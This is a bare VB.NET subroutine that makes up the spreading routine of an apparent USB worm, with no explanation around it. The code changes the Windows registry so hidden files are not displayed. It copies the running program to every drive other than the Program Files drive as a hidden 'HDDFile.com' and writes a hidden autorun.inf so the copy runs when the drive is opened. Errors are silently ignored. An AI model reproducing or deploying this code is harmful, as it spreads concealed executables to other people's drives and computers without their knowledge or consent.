Sub ThumbDrive()
On Error Resume Next
My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "0", Microsoft.Win32.RegistryValueKind.DWord)
Dim sDrive As String, sDrives() As String, xDrive As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
sDrives = System.IO.Directory.GetLogicalDrives
For Each sDrive In sDrives
If xDrive.Contains(sDrive) Then
Else
My.Computer.FileSystem.CopyFile(Application.ExecutablePath, sDrive & "HDDFile.com", True, FileIO.UICancelOption.DoNothing)
My.Computer.FileSystem.WriteAllText(sDrive & "autorun.inf", "[autorun]" & vbCrLf & "open=" & sDrive & "HDDFile.com" & vbCrLf & "shellexecute=" & sDrive, True)
SetAttr(sDrive & "HDDFile.com", FileAttribute.Hidden)
SetAttr(sDrive & "autorun.inf", FileAttribute.Hidden)
End If
Next
End Sub
